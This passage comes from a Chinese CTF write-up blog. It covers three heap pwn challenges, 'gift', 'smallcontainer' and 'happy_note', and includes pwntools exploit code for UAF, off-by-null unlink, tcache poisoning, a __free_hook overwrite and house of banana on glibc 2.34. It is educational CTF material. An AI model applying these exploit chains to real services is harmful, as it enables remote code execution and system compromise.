p.sendafter(<span class="string">b&#x27;gift!&#x27;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx).encode())    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">backdoor</span>(<span class="params">idx,num</span>):</span><br><span class="line">    p.sendlineafter(menu,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index?&#x27;</span>,<span class="built_in">str</span>(idx).encode())  </span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;How much?&#x27;</span>,<span class="built_in">str</span>(num).encode())   </span><br><span class="line"></span><br><span class="line">[add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]   <span class="comment">#0-4</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>))            <span class="comment">#5,include fake_chunk</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)                       <span class="comment">#6</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#UAF edit chunk6_fd-&gt;fake_chunk</span></span><br><span class="line">backdoor(<span class="number">5</span>,-<span class="number">0x130</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line"><span class="comment">#由于前面已经修改过fd，所以再次free chunk0不会触发检查</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;cost: &#x27;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)) -<span class="number">0x10</span> -<span class="number">96</span> -libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#libc_base = int(p.recvuntil(b&#x27;\n&#x27;))-0x3ebca0</span></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b malloc\nb free\nb realloc\nb calloc\nc&#x27;)</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line"><span class="comment">#申请回chunk5,修改其中fake_chunk_fd</span></span><br><span class="line">add(<span class="number">1</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(free_hook-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+<span class="string">b&#x27;z&#x27;</span>*<span class="number">8</span>)   <span class="comment">#chunk5,idx=7</span></span><br><span class="line"><span class="comment">#从fake_chunk开始填充，修改chunk6_content</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xd0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)            <span class="comment">#fake_chunk,idx=8</span></span><br><span class="line">add(<span class="number">1</span>,p64(system))                                           <span class="comment">#free_hook,idx=9</span></span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><hr><h3 id="2-smallcontainer"><a href="#2-smallcontainer" class="headerlink" title="2.smallcontainer"></a>2.smallcontainer</h3><h4 id="2-1-逆向分析"><a href="#2-1-逆向分析" class="headerlink" title="2.1 逆向分析"></a>2.1 逆向分析</h4><p>在edit功能中有<code>off-by-null</code>漏洞，注意最后调用的<code>check</code>函数中会将堆块内容中的<code>\x11</code>字节替换为空字节，因为没有空字节截断字符串，如果通过复用<code>prev_size</code>的方式让堆块内容区与下一个堆块的<code>size</code>产生数据粘连，那么<code>check</code>的时候就会替换到下个堆块的<code>size</code>，可以用来置空<code>inuse</code>位进行<code>unlink</code></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818140658151.png"></p><p>同时注意在<code>add</code>功能中对<code>size</code>做出一定限制，不同于普通<code>off-by-null</code>的题目，这里需要先填充<code>tcache</code>才能进入<code>unsorted_bin</code></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818141149317.png"></p><h4 id="2-2-解题"><a href="#2-2-解题" class="headerlink" title="2.2 解题"></a>2.2 解题</h4><p>首先进行堆块的布局，解释一下目的，首先申请7个堆块用于填充<code>tcache</code>链，没有其他作用，然后通过<code>chunk8</code>来进行<code>off-by-null</code>清空<code>chunk9_size</code>中的<code>inuse</code>位，然后删除<code>chunk9</code>进行<code>unlink</code>，合并<code>chunk7</code>和<code>chunk8</code>，通过<code>chunk8</code>的堆块重叠来进行<code>tcache_poisoning</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[add(<span class="number">0x1f0</span>) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">add(<span class="number">0x1f0</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x200</span>)<span class="comment">#9,target</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#10,防止合并</span></span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">delete(<span class="number">7</span>)</span><br></pre></td></tr></table></figure><p><code>unlink</code>，注意这里<code>edit</code>两次<code>chunk8</code>，第一次是清空<code>chunk9_size</code>中的<code>inuse</code>位</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143016604.png"></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143059845.png"></p><p>第二次是设置<code>chunk9_prev_size</code>位的值为<code>chunk7_size+chunk8_size</code></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143210257.png"></p><p>删除<code>chunk9</code>触发<code>unlink</code>，同时由于<code>off-by-null</code>是将<code>\x11</code>字节替换为空字节，所以<code>chunk9_size</code>就会减少<code>0x10</code>，在<code>chunk9_content</code>最后补个<code>fake_chunk_header</code>，假装包含了<code>chunk10</code>来配合检查</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143313390.png"></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143339589.png"></p><p><code>chunk7、8、9</code>合并为一个大的<code>unsorted bin</code>，此时这个<code>unsorted bin</code>就与<code>chunk8</code>存在堆重叠<br>效果图：</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818143501639.png"></p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#unlink</span></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+p64(<span class="number">0x310</span>))</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x1f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x121</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br></pre></td></tr></table></figure><p>由于堆块申请没有进行初始化，通过<code>unsorted_bin</code>残留的指针来泄露libc，这里要注意一点申请的大小是<code>0x1d0</code>，因为不能与刚开始用来填充<code>tcache</code>链的堆块<code>size</code>相同，否则就不会从<code>unsorted_bin</code>切割</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x1d0</span>)<span class="comment">#7,idx=0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;This&#x27;</span>,drop=<span class="number">1</span>),<span class="number">16</span>)-<span class="number">0x3ec0d0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><p>利用堆重叠控制<code>tcache_fd</code>打<code>free_hook</code>，我们申请<code>0x320</code>大小的堆块(<code>idx=1</code>)，会获得剩余的全部<code>unsorted_bin</code>，现在的<code>chunk1</code>包含了整个<code>chunk8</code>，所以先删除<code>chunk8</code>进入<code>tcache_0x110</code>链中，然后修改<code>chunk8_fd</code>为<code>free_hook-0x8</code>的位置，直接在<code>free_hook</code>前填充<code>/bin/sh\x00</code>字符，然后删除<code>free_hook</code>这个堆块来<code>getshell</code>，修改<code>fd</code>的时候要注意，刚刚切割原<code>chunk7</code>的时候还剩下<code>0x10</code>没分配，所以现在先填充<code>0x10</code>个字符才到<code>chunk8_header</code></p><p>此时<code>tcache</code>链表状态：</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818144700149.png"></p><p>此时申请一个堆块会重新获得原hunk8，再申请就获得<code>free_hook-0x8</code>，往里写入<code>/bin/sh</code>字符串并修改<code>free_hook</code>为<code>system</code>，最后删除自身<code>getshell</code></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818145215324.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#chunk overlap</span></span><br><span class="line">add(<span class="number">0x320</span>)<span class="comment">#8,idx=1</span></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)+p64(free_hook-<span class="number">0x8</span>))</span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#8,idx=2</span></span><br><span class="line">add(<span class="number">0x108</span>)<span class="comment">#free_hook,idx=3</span></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system))</span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>最后：</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818145302005.png"></p><hr><h3 id="3-happy-note"><a href="#3-happy-note" class="headerlink" title="3.happy_note"></a>3.happy_note</h3><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818145855828.png"></p><p>这道题在第二天早上才解出来，主要是gift那道题想了比较久，有点可惜</p><p>这道题我的解法是<code>tcache_poisioning+house_of_banana</code>，和普通的<code>house_of_banana</code>攻击不同，这题不能申请<code>largebin</code>大小的堆块自然也无法先进行<code>largebin_attack</code>，而是留下了<code>UAF</code>的<code>backdoor</code>通过<code>tcache_fd</code>来攻击<code>_rtld_global</code>结构体中的<code>link_map</code>链表</p><blockquote><p><em>关于house_of_banana我只简单提一下，house of banana 是ha1vk师傅在2020年总结出来的利用链。不同于IO_str_finish和IO_str_overflow利用，banana攻击的是rtld_global结构体中的link_map链表，大多数师傅对于banana的攻击方式主要有两种，一是攻击rtld_global这个全局符号所保存的link_map的链表，伪造整个链表，进行劫持；另外一个与之相比破坏性比较小，更容易成功。由于link_map通过链表链接，但是在加载exit的时候，相关函数智慧通过link_map-&gt;l_next指针进行相关的检查。我们可以在某个特定的位置，更改next指针，将下一以链表节点转为我们控制的地方，比如heap上。触发方式要么是能够显式的执行 exit 函数，要么是程序通过 libc_start_main 启动的主函数，且主函数能够结束</em></p></blockquote><p>我是在后面做题打<code>IO_FILE</code>的时候发现无法写入，这才去查了题目的libc版本是<code>2.34-0ubuntu3.2</code>，<code>IO_FILE</code>和<code>exit_hook</code>都已经没有写入权限，所以才使用<code>house_of_banana</code>，刚开始是用了第一种方法但是没成功，所以这里用的是方法二。由于house_of_banana我也是第一次实践，所以具体细节的话还是贴出我学习的文章，大家自行了解，我这里只具体说构造payload的部分</p><p>参考文章：</p><blockquote><p>house of banana - <a href="https://www.anquanke.com/post/id/222948?display=mobile">https://www.anquanke.com/post/id/222948?display=mobile</a></p><p>高版本glibc堆的几种利用手法 - <a href="https://zhuanlan.zhihu.com/p/535469996">https://zhuanlan.zhihu.com/p/535469996</a></p><p>house of banana 通用 exp - <a href="https://www.mrskye.cn/archives/8b3b5c42/">https://www.mrskye.cn/archives/8b3b5c42/</a></p></blockquote><h4 id="3-1-逆向分析"><a href="#3-1-逆向分析" class="headerlink" title="3.1 逆向分析"></a>3.1 逆向分析</h4><p>唯一的漏洞点是有一个隐藏选项666，留了一个只能使用一次的后门，可以实现UAF</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818151133392.png"></p><h4 id="3-2-解题"><a href="#3-2-解题" class="headerlink" title="3.2 解题"></a>3.2 解题</h4><p>堆布局</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[add(x,0x200,1) for x in range(8)]#0-7</span><br><span class="line">add(8,0x1e0,1)#8</span><br></pre></td></tr></table></figure><p>把刚开始申请的<code>8个0x200</code>的堆块都<code>free</code>掉，前7个填充<code>tcache</code>，第8个进入<code>unsorted bin</code>，注意这里是用<code>backdoor</code>功能删除<code>chunk7</code>，之后我们会反复利用这个<code>UAF</code>的指针，因为<code>backdoor</code>只能用一次，进入<code>unsorted bin</code>后通过<code>UAF</code>泄露<code>libc</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">[delete(x) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>)]</span><br><span class="line">backdoor(<span class="number">7</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x219cc0</span></span><br><span class="line">padding = libc_base + <span class="number">0x218bc0</span></span><br><span class="line">l_next = libc_base + <span class="number">0x228088</span> - <span class="number">0x8</span></span><br><span class="line">rtl_global = libc_base + <span class="number">0x266040</span></span><br><span class="line">one_gadget = libc_base + one[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base&#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;l_next&#x27;</span>,<span class="built_in">hex</span>(l_next))</span><br></pre></td></tr></table></figure><p>由于高版本的<code>tcache</code>存在<code>key</code>异或加密（具体的自行搜索高版本<code>tcache</code>的利用都会发现，这里就不展开提了），所以我们先将<code>unsorted_bin</code>切割一小块用于泄露<code>key</code>同时也获得堆地址（通过<code>UAF</code>的<code>chunk7</code>指针），这里的<code>heap</code>是之后<code>house_of_banana</code>过程中<code>chunk1</code>的堆头部地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak tcache_key</span></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="number">1</span>)<span class="comment">#7,idx=9</span></span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;content: &#x27;</span>)</span><br><span class="line">key = u64(p.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = (key&lt;&lt;<span class="number">12</span>)+<span class="number">0x500</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;key&#x27;</span>,<span class="built_in">hex</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap&#x27;</span>,<span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure><p>然后开始<code>house_of_banana</code>的第一步，先劫持<code>l_next</code>指针。首先申请回剩余的<code>unsorted bin</code>，然后free chunk8、chunk10形成链表，通过<code>UAF</code>的<code>chunk7</code>指针来修改<code>chunk10_fd</code>（chunk7是包含chunk10的），注意修改的话要先填充<code>0x10</code>个字符，因为前面的<code>chunk9</code>切割出了<code>0x20</code>作为新的chunk，内容区是<code>0x10</code>大小，然后才能修改<code>chunk10_header</code>，接着申请两个获得<code>l_next</code>，这里又需要注意，在题目给出的<code>ld</code>和<code>libc</code>中，调试出来<code>l_next</code>的地址末尾是<code>8</code>，而在新的<code>libc</code>中，堆块有检查地址必须是<code>0x10</code>的倍数来进行对齐，否则会报错，所以这里申请到<code>l_next-0x8</code>的位置进行对齐，要泄露出<code>l_next</code>的前一个地址，到时候一起填充</p><p>关于<code>l_next</code>怎么找的问题，这里说一下，首先，<code>rtld_global</code>结构体是在ld中的，如果题目没给出ld的话需要爆破，这道题的话有ld所以就不展开说，使用<code>pwndbg</code>调试去查<code>rtld_global</code>及附近的值</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818155214225.png"></p><p>我们要修改的<code>l_next</code>则是在<code>rtld_global+32</code>存储的地址附近，那么为什么是这个地址呢？注意看上图<code>rtld_global+8</code>这个位置的值是<code>4</code>，这个表示<code>ns_nloaded = 4</code>, 这里指这个链表的节点个数，在<code>exit</code>后面加载的检查中，会要求<code>ns_nloaded</code>链表的节点不少于<code>3</code>个，而我们则是要伪造成第四个节点，每个节点之间是用<code>l_next</code>指针相连接，所以要修改第三个节点的指针指向我们伪装好的堆块作为第四个节点</p><p>而第三个节点就是<code>rtld_global+32</code>存储的地址，第三个节点的<code>l_next</code>指针则是在节点地址<code>+0x18</code>位置，也就是说将现在的<code>0x00007f98e2d09a48</code>的值替换成我们要伪装节点的堆头部地址</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818160349277.png"></p><p>通过<code>tcache poisoning</code>控制<code>l_next</code>改成要伪装节点的堆头部地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#tcache poisoning</span><br><span class="line">add(10,0x1e0,1)#7,idx=10</span><br><span class="line">delete(8)</span><br><span class="line">delete(10)</span><br><span class="line">edit(7,b&#x27;a&#x27;*0x10+p64(0)+p64(0x1f1)+p64(key^l_next))</span><br><span class="line">add(10,0x1e0,2)#7,idx=10</span><br><span class="line">add(11,0x1e0,2)#target</span><br><span class="line">edit(11,p64(padding)+p64(heap))</span><br></pre></td></tr></table></figure><p>接下来就是<code>house_of_banana</code>的下一步，伪造节点的内容。要设置的内容如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*(fake+<span class="number">0x28</span>)=fake。</span><br><span class="line">*(fake +<span class="number">0x48</span>)=fake+<span class="number">0x58</span>, *(fake+<span class="number">0x50</span>) = <span class="number">0x8</span></span><br><span class="line">*(fake+<span class="number">0x58</span>) = shell</span><br><span class="line">*(fake+<span class="number">0x110</span>) = fake+<span class="number">0x40</span></span><br><span class="line">*(fake+<span class="number">0x120</span>) = fake+<span class="number">0x48</span></span><br><span class="line">(<span class="built_in">int</span>)*(fake+<span class="number">0x31c</span>) = <span class="number">0x9</span></span><br></pre></td></tr></table></figure><p>但是由于题目的限制，是不能申请超过<code>0x200</code>大小的堆块的，所以只好申请两个堆块来分开构造，注意构造中偏移量与上面内容少<code>0x10</code>的原因是要计算堆头部占的空间（0x10字节），因为我们写入<code>l_next</code>是写的堆头部的位置的地址而不是内容区的地址（虽然也可以这么做），最后一步是通过<code>delete</code>功能中删除对应idx为空的堆块（只要是现在没在使用的<code>idx</code>都行）来显式调用<code>exit()</code>触发攻击流程</p><p>直接来看下堆的内存状态（从现在的<code>chunk1</code>开始）：</p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818162604151.png"></p><p><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818163059992.png"></p><p>代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#house of banana</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x1f8</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x1f8</span>,<span class="number">1</span>)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span></span><br><span class="line">payload += p64(heap)</span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x58</span>)</span><br><span class="line">payload += p64(<span class="number">0x8</span>)</span><br><span class="line">payload += p64(one_gadget)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x40</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap+<span class="number">0x48</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x1f8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*(<span class="number">0x31c</span>-<span class="number">0x10</span>-<span class="number">0x200</span>)+p8(<span class="number">0x9</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"><span class="comment">#exit</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>执行<code>exit</code>后，程序执行流来到one_gadget：<br><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818162349080.png"></p><p>getshell：<br><img src="/2022/08/18/2022%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B%E5%88%9D%E8%B5%9BWriteup/image-20220818161514074.png"></p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 